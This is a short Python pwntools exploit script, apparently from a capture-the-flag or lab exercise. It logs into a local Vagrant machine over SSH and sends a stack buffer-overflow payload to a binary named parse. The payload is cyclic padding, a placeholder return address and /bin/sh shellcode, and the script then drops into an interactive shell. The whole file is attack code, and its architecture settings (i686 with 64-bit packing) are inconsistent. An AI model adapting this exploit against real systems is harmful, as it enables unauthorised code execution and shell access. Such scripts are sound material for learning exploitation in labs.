from pwn import *
import base64

context.update(arch='i686', os='linux')

# Connect to the server with SSH
ssh_connection = ssh('vagrant', 'default', port=2222)

# Open a shell to write more stuff to
bash = ssh_connection.run('bash')

shellcode = shellcraft.sh()
print(shellcode)
print(hexdump(asm(shellcode)))

payload  = cyclic(cyclic_find(0x0000555555555751))
payload += p64(0xdeadbeef)
payload += asm(shellcode)

bash.sendline('/vagrant/parse')
bash.sendline(payload)
bash.interactive()

